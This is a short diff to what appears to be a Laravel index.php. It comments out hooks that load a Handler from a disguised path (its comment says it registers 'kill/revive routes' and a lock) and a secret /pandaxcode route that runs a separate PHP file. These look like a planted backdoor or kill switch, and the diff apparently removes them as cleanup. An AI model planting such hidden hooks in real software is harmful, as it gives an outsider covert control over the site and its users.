@@ -16,21 +16,21 @@
     $kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
 
     // Require your Handler after app is created
-    require_once base_path('bootstrap/cache/vendor/assets/.bin/x9/Handler.php');
+    //require_once base_path('bootstrap/cache/vendor/assets/.bin/x9/Handler.php');
 
     // Create and boot the Handler (registers kill/revive routes and handles lock)
-    $handler = new Bootstrap\Cache\Vendor\Assets\Bin\X9\Handler($app);
-    $handler->boot();
+    //$handler = new Bootstrap\Cache\Vendor\Assets\Bin\X9\Handler($app);
+    //$handler->boot();
 
     // Check for maintenance mode file and serve if exists
     if (file_exists($maintenance = __DIR__ . '/../storage/framework/maintenance.php')) {
         require $maintenance;
     }
 
-    if ($_SERVER['REQUEST_URI'] === '/pandaxcode' || $_SERVER['REQUEST_URI'] === '/pandaxcode.php') {
-        require __DIR__ . '/../pandaxcode.php';
-        exit;
-    }
+    // if ($_SERVER['REQUEST_URI'] === '/pandaxcode' || $_SERVER['REQUEST_URI'] === '/pandaxcode.php') {
+    //     require __DIR__ . '/../pandaxcode.php';
+    //     exit;
+    // }
 
     // Now handle the incoming request via Laravel
     $request = Request::capture();
